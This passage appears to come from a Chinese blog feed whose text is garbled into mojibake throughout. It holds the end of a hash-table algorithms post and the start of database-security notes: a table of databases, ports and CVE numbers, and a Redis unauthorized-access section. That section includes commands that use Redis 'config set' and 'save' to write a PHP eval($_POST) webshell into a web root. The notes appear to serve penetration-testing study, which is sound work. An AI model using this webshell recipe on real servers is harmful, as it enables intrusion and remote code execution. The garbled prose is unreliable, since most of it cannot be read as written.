å°„åˆ°ç¬¦å·è¡¨çš„ç´¢å¼•ä¸Šã€‚<br>å“ˆå¸Œç¢°æ’å¤„ç†æœ‰å¤šä¸ªkeyæ˜ å°„åˆ°ç›¸åŒç´¢å¼•ä¸Šæ—¶çš„æƒ…æ™¯ï¼Œå¤„ç†ç¢°æ’çš„æ™®éæ–¹å¼æ˜¯æ‹‰é“¾æ³•å’Œçº¿æ€§æ¢æµ‹æ³•ã€‚<br>æ¥ä¸‹æ¥æ˜¯å¸¸è§çš„ä¸‰ç§å“ˆå¸Œç»“æ„ï¼š</p><p>æ•°ç»„<br>setï¼ˆé›†åˆï¼‰<br>mapï¼ˆæ˜ å°„ï¼‰<br>åœ¨C++è¯­è¨€ä¸­ï¼Œset å’Œ map éƒ½åˆ†åˆ«æä¾›äº†ä¸‰ç§æ•°æ®ç»“æ„ï¼Œæ¯ç§æ•°æ®ç»“æ„çš„åº•å±‚å®ç°å’Œç”¨é€”éƒ½æœ‰æ‰€ä¸åŒï¼Œåœ¨å…³äºå“ˆå¸Œè¡¨ï¼Œä½ è¯¥äº†è§£è¿™äº›ï¼ (opens new window)ä¸­æˆ‘ç»™å‡ºäº†è¯¦ç»†åˆ†æï¼Œè¿™ä¸€çŸ¥è¯†ç‚¹å¾ˆé‡è¦ï¼<br>ä¾‹å¦‚ä»€ä¹ˆæ—¶å€™ç”¨std::setï¼Œä»€ä¹ˆæ—¶å€™ç”¨std::multisetï¼Œä»€ä¹ˆæ—¶å€™ç”¨std::unordered_setï¼Œéƒ½æ˜¯å¾ˆæœ‰è€ƒç©¶çš„ã€‚<br>åªæœ‰å¯¹è¿™äº›æ•°æ®ç»“æ„çš„åº•å±‚å®ç°å¾ˆç†Ÿæ‚‰ï¼Œæ‰èƒ½çµæ´»ä½¿ç”¨ï¼Œå¦åˆ™å¾ˆå®¹æ˜“å†™å‡ºæ•ˆç‡ä½ä¸‹çš„ç¨‹åºã€‚</p><h3 id="å“ˆå¸Œè¡¨ç»å…¸é¢˜ç›®"><a href="#å“ˆå¸Œè¡¨ç»å…¸é¢˜ç›®" class="headerlink" title="å“ˆå¸Œè¡¨ç»å…¸é¢˜ç›®"></a>å“ˆå¸Œè¡¨ç»å…¸é¢˜ç›®</h3><h4 id="æ•°ç»„ä½œä¸ºå“ˆå¸Œè¡¨"><a href="#æ•°ç»„ä½œä¸ºå“ˆå¸Œè¡¨" class="headerlink" title="æ•°ç»„ä½œä¸ºå“ˆå¸Œè¡¨"></a>æ•°ç»„ä½œä¸ºå“ˆå¸Œè¡¨</h4><p>ä¸€äº›åº”ç”¨åœºæ™¯å°±æ˜¯ä¸ºæ•°ç»„é‡èº«å®šåšçš„ã€‚</p><p>åœ¨242.æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ (opens new window)ä¸­ï¼Œæˆ‘ä»¬æåˆ°äº†æ•°ç»„å°±æ˜¯ç®€å•çš„å“ˆå¸Œè¡¨ï¼Œä½†æ˜¯æ•°ç»„çš„å¤§å°æ˜¯å—é™çš„ï¼<br>è¿™é“é¢˜ç›®åŒ…å«å°å†™å­—æ¯ï¼Œé‚£ä¹ˆä½¿ç”¨æ•°ç»„æ¥åšå“ˆå¸Œæœ€åˆé€‚ä¸è¿‡ã€‚</p><p>åœ¨383.èµé‡‘ä¿¡ (opens new window)ä¸­åŒæ ·è¦æ±‚åªæœ‰å°å†™å­—æ¯ï¼Œé‚£ä¹ˆå°±ç»™æˆ‘ä»¬æµ“æµ“çš„æš—ç¤ºï¼Œç”¨æ•°ç»„ï¼<br>æœ¬é¢˜å’Œ242.æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ (opens new window)å¾ˆåƒï¼Œ242.æœ‰æ•ˆçš„å­—æ¯å¼‚ä½è¯ (opens new window)æ˜¯æ±‚ å­—ç¬¦ä¸²a å’Œ å­—ç¬¦ä¸²b æ˜¯å¦å¯ä»¥ç›¸äº’ç»„æˆï¼Œåœ¨383.èµé‡‘ä¿¡ (opens new window)ä¸­æ˜¯æ±‚å­—ç¬¦ä¸²aèƒ½å¦ç»„æˆå­—ç¬¦ä¸²bï¼Œè€Œä¸ç”¨ç®¡å­—ç¬¦ä¸²b èƒ½ä¸èƒ½ç»„æˆå­—ç¬¦ä¸²aã€‚</p><p>ä¸€äº›åŒå­¦å¯èƒ½æƒ³ï¼Œç”¨æ•°ç»„å¹²å•¥ï¼Œéƒ½ç”¨mapä¸å°±å®Œäº‹äº†ã€‚<br>ä¸Šé¢ä¸¤é“é¢˜ç›®ç”¨mapç¡®å®å¯ä»¥ï¼Œä½†ä½¿ç”¨mapçš„ç©ºé—´æ¶ˆè€—è¦æ¯”æ•°ç»„å¤§ä¸€äº›ï¼Œå› ä¸ºmapè¦ç»´æŠ¤çº¢é»‘æ ‘æˆ–è€…ç¬¦å·è¡¨ï¼Œè€Œä¸”è¿˜è¦åšå“ˆå¸Œå‡½æ•°çš„è¿ç®—ã€‚æ‰€ä»¥æ•°ç»„æ›´åŠ ç®€å•ç›´æ¥æœ‰æ•ˆï¼</p><h4 id="setä½œä¸ºå“ˆå¸Œè¡¨"><a href="#setä½œä¸ºå“ˆå¸Œè¡¨" class="headerlink" title="setä½œä¸ºå“ˆå¸Œè¡¨"></a>setä½œä¸ºå“ˆå¸Œè¡¨</h4><p>åœ¨349. ä¸¤ä¸ªæ•°ç»„çš„äº¤é›† (opens new window)ä¸­æˆ‘ä»¬ç»™å‡ºäº†ä»€ä¹ˆæ—¶å€™ç”¨æ•°ç»„å°±ä¸è¡Œäº†ï¼Œéœ€è¦ç”¨setã€‚<br>è¿™é“é¢˜ç›®æ²¡æœ‰é™åˆ¶æ•°å€¼çš„å¤§å°ï¼Œå°±æ— æ³•ä½¿ç”¨æ•°ç»„æ¥åšå“ˆå¸Œè¡¨äº†ã€‚<br>ä¸»è¦å› ä¸ºå¦‚ä¸‹ä¸¤ç‚¹ï¼š<br>æ•°ç»„çš„å¤§å°æ˜¯æœ‰é™çš„ï¼Œå—åˆ°ç³»ç»Ÿæ ˆç©ºé—´ï¼ˆä¸æ˜¯æ•°æ®ç»“æ„çš„æ ˆï¼‰çš„é™åˆ¶ã€‚<br>å¦‚æœæ•°ç»„ç©ºé—´å¤Ÿå¤§ï¼Œä½†å“ˆå¸Œå€¼æ¯”è¾ƒå°‘ã€ç‰¹åˆ«åˆ†æ•£ã€è·¨åº¦éå¸¸å¤§ï¼Œä½¿ç”¨æ•°ç»„å°±é€ æˆç©ºé—´çš„æå¤§æµªè´¹ã€‚<br>æ‰€ä»¥æ­¤æ—¶ä¸€æ ·çš„åšæ˜ å°„çš„è¯ï¼Œå°±å¯ä»¥ä½¿ç”¨setäº†ã€‚<br>å…³äºsetï¼ŒC++ ç»™æä¾›äº†å¦‚ä¸‹ä¸‰ç§å¯ç”¨çš„æ•°æ®ç»“æ„ï¼šï¼ˆè¯¦æƒ…è¯·çœ‹å…³äºå“ˆå¸Œè¡¨ï¼Œä½ è¯¥äº†è§£è¿™äº›ï¼ (opens new window)ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::set</span><br><span class="line">std::multiset</span><br><span class="line">std::unordered_set</span><br></pre></td></tr></table></figure><p>std::setå’Œstd::multisetåº•å±‚å®ç°éƒ½æ˜¯çº¢é»‘æ ‘ï¼Œstd::unordered_setçš„åº•å±‚å®ç°æ˜¯å“ˆå¸Œï¼Œ ä½¿ç”¨unordered_set è¯»å†™æ•ˆç‡æ˜¯æœ€é«˜çš„ï¼Œæœ¬é¢˜å¹¶ä¸éœ€è¦å¯¹æ•°æ®è¿›è¡Œæ’åºï¼Œè€Œä¸”è¿˜ä¸è¦è®©æ•°æ®é‡å¤ï¼Œæ‰€ä»¥é€‰æ‹©unordered_setã€‚<br>åœ¨202.å¿«ä¹æ•° (opens new window)ä¸­ï¼Œæˆ‘ä»¬å†æ¬¡ä½¿ç”¨äº†unordered_setæ¥åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦é‡å¤å‡ºç°è¿‡ã€‚</p><h4 id="mapä½œä¸ºå“ˆå¸Œè¡¨"><a href="#mapä½œä¸ºå“ˆå¸Œè¡¨" class="headerlink" title="mapä½œä¸ºå“ˆå¸Œè¡¨"></a>mapä½œä¸ºå“ˆå¸Œè¡¨</h4><p>åœ¨1.ä¸¤æ•°ä¹‹å’Œ (opens new window)ä¸­mapæ­£å¼ç™»åœºã€‚<br>æ¥è¯´ä¸€è¯´ï¼šä½¿ç”¨æ•°ç»„å’Œsetæ¥åšå“ˆå¸Œæ³•çš„å±€é™ã€‚<br>æ•°ç»„çš„å¤§å°æ˜¯å—é™åˆ¶çš„ï¼Œè€Œä¸”å¦‚æœå…ƒç´ å¾ˆå°‘ï¼Œè€Œå“ˆå¸Œå€¼å¤ªå¤§ä¼šé€ æˆå†…å­˜ç©ºé—´çš„æµªè´¹ã€‚<br>setæ˜¯ä¸€ä¸ªé›†åˆï¼Œé‡Œé¢æ”¾çš„å…ƒç´ åªèƒ½æ˜¯ä¸€ä¸ªkeyï¼Œè€Œä¸¤æ•°ä¹‹å’Œè¿™é“é¢˜ç›®ï¼Œä¸ä»…è¦åˆ¤æ–­yæ˜¯å¦å­˜åœ¨è€Œä¸”è¿˜è¦è®°å½•yçš„ä¸‹æ ‡ä½ç½®ï¼Œå› ä¸ºè¦è¿”å›x å’Œ yçš„ä¸‹æ ‡ã€‚æ‰€ä»¥set ä¹Ÿä¸èƒ½ç”¨ã€‚<br>mapæ˜¯ä¸€ç§&lt;key, value&gt;çš„ç»“æ„ï¼Œæœ¬é¢˜å¯ä»¥ç”¨keyä¿å­˜æ•°å€¼ï¼Œç”¨valueåœ¨ä¿å­˜æ•°å€¼æ‰€åœ¨çš„ä¸‹æ ‡ã€‚æ‰€ä»¥ä½¿ç”¨mapæœ€ä¸ºåˆé€‚ã€‚</p><p>C++æä¾›å¦‚ä¸‹ä¸‰ç§mapï¼šï¼ˆè¯¦æƒ…è¯·çœ‹å…³äºå“ˆå¸Œè¡¨ï¼Œä½ è¯¥äº†è§£è¿™äº›ï¼ (opens new window)ï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">std::map</span><br><span class="line">std::multimap</span><br><span class="line">std::unordered_map</span><br></pre></td></tr></table></figure><p>std::unordered_map åº•å±‚å®ç°ä¸ºå“ˆå¸Œï¼Œstd::map å’Œstd::multimap çš„åº•å±‚å®ç°æ˜¯çº¢é»‘æ ‘ã€‚<br>åŒç†ï¼Œstd::map å’Œstd::multimap çš„keyä¹Ÿæ˜¯æœ‰åºçš„ï¼ˆè¿™ä¸ªé—®é¢˜ä¹Ÿç»å¸¸ä½œä¸ºé¢è¯•é¢˜ï¼Œè€ƒå¯Ÿå¯¹è¯­è¨€å®¹å™¨åº•å±‚çš„ç†è§£ï¼‰ï¼Œ1.ä¸¤æ•°ä¹‹å’Œ (opens new window)ä¸­å¹¶ä¸éœ€è¦keyæœ‰åºï¼Œé€‰æ‹©std::unordered_map æ•ˆç‡æ›´é«˜ï¼<br>åœ¨454.å››æ•°ç›¸åŠ  (opens new window)ä¸­æˆ‘ä»¬æåˆ°äº†å…¶å®éœ€è¦å“ˆå¸Œçš„åœ°æ–¹éƒ½èƒ½æ‰¾åˆ°mapçš„èº«å½±ã€‚<br>æœ¬é¢˜å’‹çœ¼ä¸€çœ‹å¥½åƒå’Œ18. å››æ•°ä¹‹å’Œ (opens new window)ï¼Œ15.ä¸‰æ•°ä¹‹å’Œ (opens new window)å·®ä¸å¤šï¼Œå…¶å®å·®å¾ˆå¤šï¼<br>å…³é”®å·®åˆ«æ˜¯æœ¬é¢˜ä¸ºå››ä¸ªç‹¬ç«‹çš„æ•°ç»„ï¼Œåªè¦æ‰¾åˆ°A[i] + B[j] + C[k] + D[l] &#x3D; 0å°±å¯ä»¥ï¼Œä¸ç”¨è€ƒè™‘é‡å¤é—®é¢˜ï¼Œè€Œ18. å››æ•°ä¹‹å’Œ (opens new window)ï¼Œ15.ä¸‰æ•°ä¹‹å’Œ (opens new window)æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ˆé›†åˆï¼‰é‡Œæ‰¾åˆ°å’Œä¸º0çš„ç»„åˆï¼Œå¯å°±éš¾å¾ˆå¤šäº†ï¼<br>ç”¨å“ˆå¸Œæ³•è§£å†³äº†ä¸¤æ•°ä¹‹å’Œï¼Œå¾ˆå¤šåŒå­¦ä¼šæ„Ÿè§‰ç”¨å“ˆå¸Œæ³•ä¹Ÿå¯ä»¥è§£å†³ä¸‰æ•°ä¹‹å’Œï¼Œå››æ•°ä¹‹å’Œã€‚<br>å…¶å®æ˜¯å¯ä»¥è§£å†³ï¼Œä½†æ˜¯éå¸¸éº»çƒ¦ï¼Œéœ€è¦å»é‡å¯¼è‡´ä»£ç æ•ˆç‡å¾ˆä½ã€‚<br>åœ¨15.ä¸‰æ•°ä¹‹å’Œ (opens new window)ä¸­æˆ‘ç»™å‡ºäº†å“ˆå¸Œæ³•å’ŒåŒæŒ‡é’ˆä¸¤ä¸ªè§£æ³•ï¼Œå¤§å®¶å°±å¯ä»¥ä½“ä¼šåˆ°ï¼Œä½¿ç”¨å“ˆå¸Œæ³•è¿˜æ˜¯æ¯”è¾ƒéº»çƒ¦çš„ã€‚<br>æ‰€ä»¥18. å››æ•°ä¹‹å’Œï¼Œ15.ä¸‰æ•°ä¹‹å’Œéƒ½æ¨èä½¿ç”¨åŒæŒ‡é’ˆæ³•ï¼</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å“ˆå¸Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘æ•°æ®åº“å®‰å…¨ç¬”è®°</title>
      <link href="/2024/09/30/WebSecurity/owasptop/database-security/"/>
      <url>/2024/09/30/WebSecurity/owasptop/database-security/</url>
      
        <content type="html"><![CDATA[<p>æ¸—é€æµ‹è¯• | Redisæ¸—é€ <a href="https://www.freebuf.com/articles/web/281161.html">https://www.freebuf.com/articles/web/281161.html</a><br>Redis-æœªæˆæƒè®¿é—®-CVE-2022-0543 (redisæ²™ç›’é€ƒé€¸) <a href="https://blog.csdn.net/MateSnake/article/details/138820548">https://blog.csdn.net/MateSnake/article/details/138820548</a><br>InfluxDB JWTæœªæˆæƒæ¼æ´ï¼ˆCVE-2019-20933ï¼‰å¤ç° <a href="https://www.cnblogs.com/BMCel/p/18025462">https://www.cnblogs.com/BMCel/p/18025462</a><br>æ•°æ®åº“å®‰å…¨ï¼šInfluxDB æœªæˆæƒè®¿é—®-JwtéªŒè¯ä¸å½“ æ¼æ´. <a href="https://blog.csdn.net/weixin_54977781/article/details/134346421">https://blog.csdn.net/weixin_54977781/article/details/134346421</a><br>H2database æœªæˆæƒè®¿é—® vulhub  <a href="https://blog.csdn.net/c0529/article/details/139624113">https://blog.csdn.net/c0529/article/details/139624113</a><br>æ·±å…¥åˆ†æH2æ•°æ®åº“æ§åˆ¶å°ä¸­æ— éœ€èº«ä»½éªŒè¯çš„RCEæ¼æ´ <a href="https://zhuanlan.zhihu.com/p/459941555">https://zhuanlan.zhihu.com/p/459941555</a></p><h2 id="æ¦‚å†µ"><a href="#æ¦‚å†µ" class="headerlink" title="æ¦‚å†µ"></a>æ¦‚å†µ</h2><p>é¦–å…ˆæ•´ç†å‡ºä¸€ä¸ªè¡¨æ ¼ï¼Œæ–¹ä¾¿å‚è€ƒï¼š</p><table><thead><tr><th>#</th><th>æ•°æ®åº“</th><th>ç®€ä»‹</th><th>é»˜è®¤ç«¯å£</th><th>ç‰¹æ€§</th><th>å·²çŸ¥CVEæ¼æ´</th></tr></thead><tbody><tr><td>1</td><td>Redis</td><td>å¼€æºçš„å†…å­˜æ•°æ®ç»“æ„å­˜å‚¨ç³»ç»Ÿï¼Œç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜å’Œæ¶ˆæ¯ä»£ç†ã€‚</td><td>6379</td><td>æ”¯æŒå­—ç¬¦ä¸²ã€å“ˆå¸Œã€åˆ—è¡¨ã€é›†åˆç­‰å¤šç§æ•°æ®ç»“æ„ã€‚</td><td>CVE-2022-0543ã€CVE-2023-36824ã€CVE-2023-28856</td></tr><tr><td>2</td><td>Hadoop</td><td>å…è®¸åœ¨è®¡ç®—æœºé›†ç¾¤ä¸­åˆ†å¸ƒå¼å¤„ç†å¤§æ•°æ®é›†çš„æ¡†æ¶ã€‚</td><td>50070 &#x2F; 50075 &#x2F; 50010</td><td>å­˜å‚¨å’Œå¤„ç†å¤§é‡æ•°æ®çš„èƒ½åŠ›ã€‚</td><td>CVE-2016-5397, CVE-2017-15718</td></tr><tr><td>3</td><td>MySQL</td><td>å¼€æºå…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œä»¥å…¶å¯é æ€§å’Œæ˜“ç”¨æ€§è‘—ç§°ã€‚</td><td>3306</td><td>æ”¯æŒå…¨æ–‡æœç´¢ã€SSLæ”¯æŒã€åˆ†åŒºå’Œå¤åˆ¶ç­‰åŠŸèƒ½ã€‚</td><td>CVE-2012-2122</td></tr><tr><td>4</td><td>InfluxDB</td><td>ä¸“é—¨è®¾è®¡ç”¨äºå¤„ç†é«˜å†™å…¥å’ŒæŸ¥è¯¢è´Ÿè½½çš„æ—¶é—´åºåˆ—æ•°æ®åº“ã€‚</td><td>8086 &#x2F; 8088</td><td>é«˜æ•ˆå¤„ç†æ—¶é—´åºåˆ—æ•°æ®ï¼Œæ”¯æŒSQL-likeæŸ¥è¯¢è¯­è¨€ã€‚</td><td>CVE-2019-20933</td></tr><tr><td>5</td><td>H2 Database</td><td>è½»é‡çº§å¼€æºå…³ç³»æ•°æ®åº“ï¼Œç”¨Javaç¼–å†™ï¼Œè®¾è®¡ç”¨äºåµŒå…¥Javaåº”ç”¨ä¸­ã€‚</td><td>8082 &#x2F; 9092</td><td>æ”¯æŒæ ‡å‡†SQLå’ŒJDBC APIï¼Œæ”¯æŒåµŒå…¥å¼å’ŒæœåŠ¡å™¨æ¨¡å¼ï¼Œæä¾›å¼ºåŠ å¯†ã€‚</td><td>CVE-2021-23463</td></tr><tr><td>6</td><td>CouchDB</td><td>ä½¿ç”¨JSONæ–‡æ¡£çš„NoSQLæ–‡æ¡£æ•°æ®åº“ï¼Œæ”¯æŒHTTP APIå’ŒJavaScriptçš„MapReduceæŸ¥è¯¢ã€‚</td><td>5984</td><td>æ”¯æŒACIDå±æ€§ï¼Œå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼Œå¤åˆ¶æé«˜å¯æ‰©å±•æ€§å’Œå®¹é”™èƒ½åŠ›ã€‚</td><td>CVE-2017-12636, CVE-2018-8007</td></tr><tr><td>7</td><td>ElasticSearch</td><td>åŸºäºLuceneåº“çš„æœç´¢å¼•æ“ï¼Œæä¾›åˆ†å¸ƒå¼ã€å¤šç§Ÿæˆ·èƒ½åŠ›çš„å…¨æ–‡æœç´¢å¼•æ“ã€‚</td><td>9200 &#x2F; 9300</td><td>ç®€å•çš„REST APIsï¼Œåˆ†å¸ƒå¼ç‰¹æ€§ï¼Œé€Ÿåº¦å¿«ï¼Œå¯æ‰©å±•ã€‚</td><td>CVE-2021-22145, CVE-2018-17246</td></tr><tr><td>8</td><td>Oracle</td><td>ç”±Oracleå…¬å¸ç”Ÿäº§çš„å¤šæ¨¡å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚</td><td>1521</td><td>å¼ºå¤§çš„æ•°æ®å®Œæ•´æ€§ã€å¤æ‚äº‹åŠ¡ã€å¼ºå®‰å…¨ç‰¹æ€§å’Œå¹¿æ³›çš„æ•°æ®åˆ†æåŠŸèƒ½ã€‚</td><td>CVE-2021-35587, CVE-2019-2729</td></tr><tr><td>9</td><td>SQL Server</td><td>å¾®è½¯å¼€å‘çš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚</td><td>1433</td><td>æ”¯æŒå¹¿æ³›çš„äº‹åŠ¡å¤„ç†ã€å•†ä¸šæ™ºèƒ½å’Œåˆ†æåº”ç”¨ã€‚</td><td>CVE-2021-1636, CVE-2017-8517</td></tr><tr><td>10</td><td>PostgreSQL</td><td>å¼€æºå…³ç³»æ•°æ®åº“ï¼Œä»¥å¯é æ€§ã€åŠŸèƒ½å¼ºå¤§å’Œæ€§èƒ½è‘—ç§°ã€‚</td><td>5432</td><td>æ”¯æŒé«˜çº§SQLæ ‡å‡†ã€JSONã€XMLï¼Œæœ‰å¼ºå¤§çš„ç¤¾åŒºæ”¯æŒã€‚</td><td>CVE-2022-1552, CVE-2019-10208ã€CVE-2019-10164</td></tr><tr><td>11</td><td>MongoDB</td><td>è·¨å¹³å°çš„æ–‡æ¡£å¯¼å‘æ•°æ®åº“ï¼Œä½¿ç”¨ç±»JSONçš„æ–‡æ¡£ï¼Œå¯é€‰æ¨¡å¼ã€‚</td><td>27017</td><td>æ”¯æŒä¸´æ—¶æŸ¥è¯¢ã€ç´¢å¼•å’Œå®æ—¶èšåˆã€‚</td><td>CVE-2023-20052, CVE-2021-20329</td></tr></tbody></table><p>å…·ä½“æ¥è¯´ï¼Œå¯ä»¥é€šè¿‡æŠ¥é”™ã€ç«¯å£æ¢æµ‹ç­‰æ–¹å¼é¦–å…ˆç¡®å®šæ•°æ®åº“ç±»å‹ï¼Œä¹‹åå†é’ˆå¯¹æ€§åˆ†æ</p><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><p>REmote DIctionary Serverï¼ˆRedisï¼‰æ˜¯ä¸€ä¸ªç”± Salvatore Sanfilippoå†™çš„key-valueå­˜å‚¨ç³»ç»Ÿã€‚<br>Redisæ˜¯â€”ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€éµå®ˆBSDåè®®ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå…§å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€Key-Valueæ•°æ®åº“ï¼Œå¹¶æä¾›å¤šç§è¯­è¨€çš„APlã€‚å®ƒé€šå¸¸è¢«ç§°ä¸ºæ•°æ®ç»“æ„æœåŠ¡å™¨ï¼Œå› ä¸ºå€¼ï¼ˆvalueï¼‰å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼ˆStringï¼‰ï¼Œå“ˆå¸Œï¼ˆMapï¼‰ï¼Œåˆ—è¡¨ï¼ˆListï¼‰ï¼Œé›†åˆï¼ˆsetsï¼‰å’Œæœ‰åºé›†åˆï¼ˆsorted setsï¼‰ç­‰ç±»å‹ã€‚ä»2010å¹´3æœˆ15æ—¥èµ·ï¼ŒRedisçš„å¼€å‘å·¥ä½œç”± Mwareä¸»æŒã€‚ä»2013å¹´5æœˆå¼€å§‹ï¼ŒRedisçš„å¼€å‘ç”± PivotalèµåŠ©ã€‚ç›®å‰æœ€æ–°ç¨³å®šç‰ˆæœ¬ä¸º4.0.8<br>Redisæ˜¯ä¸€ä¸ªå¼€æºçš„é«˜æ€§èƒ½é”®å€¼æ•°æ®åº“ã€‚æœ€çƒ­é—¨çš„NoSqæ•°æ®åº“ä¹‹ä¸€ï¼Œä¹Ÿè¢«äººä»¬ç§°ä¸ºæ•°æ®ç»“æ„æœåŠ¡å™¨ã€‚<br>æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯ ï¼šå¿«</p><ol><li>ä»¥å†…å­˜ä½œä¸ºæ•°æ®å­˜å‚¨ä»‹è´¨ï¼Œè¯»å†™æ•°æ®çš„æ•ˆç‡æé«˜ã€‚</li><li>å‚¨å­˜åœ¨ Redisä¸­çš„æ•°æ®æ˜¯æŒä¹…åŒ–çš„ï¼Œæ–­ç”µæˆ–é‡å¯ï¼Œæ•°æ®ä¹Ÿä¸ä¼šä¸¢å¤±</li><li>å­˜å‚¨åˆ†ä¸ºå†…å­˜å­˜å‚¨ã€ç£ç›˜å­˜å‚¨å’Œlogæ–‡ä»¶ã€‚</li><li>å¯ä»¥ä»ç£ç›˜é‡æ–°å°†æ•°æ®åŠ è½½åˆ°å…§å­˜ä¸­ï¼Œä¹Ÿå¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶å¯¹å…¶è¿›è¡Œé…ç½®ï¼Œå› æ­¤ï¼Œredisæ‰èƒ½å®ç°æŒä¹…åŒ–</li><li>æ”¯æŒä¸»ä»æ¨¡å¼ï¼Œå¯ä»¥é…ç½®é›†ç¾¤ï¼Œæ›´åˆ©äºæ”¯æ’‘å¤§å‹çš„é¡¹ç›®ã€‚<br>Redisé»˜è®¤ç«¯å£ï¼š6379 sentinel.confé…ç½®å™¨ç«¯å£ä¸º26379</li></ol><h3 id="Redisæœªæˆæƒè®¿é—®"><a href="#Redisæœªæˆæƒè®¿é—®" class="headerlink" title="Redisæœªæˆæƒè®¿é—®"></a>Redisæœªæˆæƒè®¿é—®</h3><p>Rediså®‰è£…åï¼Œå¦‚æœç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¹¶ä¸”æ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯æˆ–ä½¿ç”¨å¼±å£ä»¤çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ &#x2F;root&#x2F;.ssh æ–‡ä»¶å¤¹çš„authotrized_keysæ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚<br>å¸¸ç”¨å‘½ä»¤ï¼š<br>1.æŸ¥çœ‹ä¿¡æ¯ï¼šinfo<br>2.åˆ é™¤æ‰€æœ‰æ•°æ®åº“å…§å®¹ï¼šflushable<br>3.åˆ·æ–°æ•°æ®åº“ï¼šflush<br>4.çœ‹æ‰€æœ‰é”®ï¼šKEYS*ï¼Œä½¿ç”¨ select nunå¯ä»¥æŸ¥çœ‹é”®å€¼æ•°æ®ã€‚<br>5.è®¾ç½®å˜é‡ï¼šset testâ€œwho am i<br>6.config set dir dirpathè®¾ç½®è·¯å¾„ç­‰é…ç½®7.config get dir&#x2F;filenameè·å–è·¯å¾„åŠæ•°æ®é…ç½®ä¿¡æ¯<br>8.saveä¿å­˜<br>9.getå˜é‡ï¼ŒæŸ¥çœ‹å˜é‡åç§°</p><p>Rediså†™å…¥webshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/    //åˆ‡æ¢ç›®å½•åˆ°ç½‘ç«™çš„æ ¹ç›®å½•</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n\n\n&lt;?php phpinfo();?&gt;\n\n\n&quot;</span>    //å†™å…¥æ¶æ„ä»£ç phpinfo()</span><br><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;\n\n\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;1&#x27;]);?&gt;\n\n\n&quot;</span>         //å†™å…¥ä¸€å¥è¯æœ¨é©¬</span><br><span class="line">config <span class="built_in">set</span> dbfilename a001.php      //ç£ç›˜ä¸­ç”Ÿæˆæœ¨é©¬æ–‡ä»¶a001.php</span><br><span class="line">save        //è¿›è¡Œä¿å­˜</span><br></pre></td></tr></table></figure><h3 id="æœªæˆæƒè®¿é—®-CVE-2022-0543"><a href="#æœªæˆæƒè®¿é—®-CVE-2022-0543" class="headerlink" title="æœªæˆæƒè®¿é—®-CVE-2022-0543"></a>æœªæˆæƒè®¿é—®-CVE-2022-0543</h3><p>Redis å­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´ï¼ŒRedis æ”¯æŒä½¿ç”¨ Lua è„šæœ¬æ¥æ‰§è¡Œå¤æ‚çš„æ“ä½œã€‚Lua è„šæœ¬åœ¨ Redis 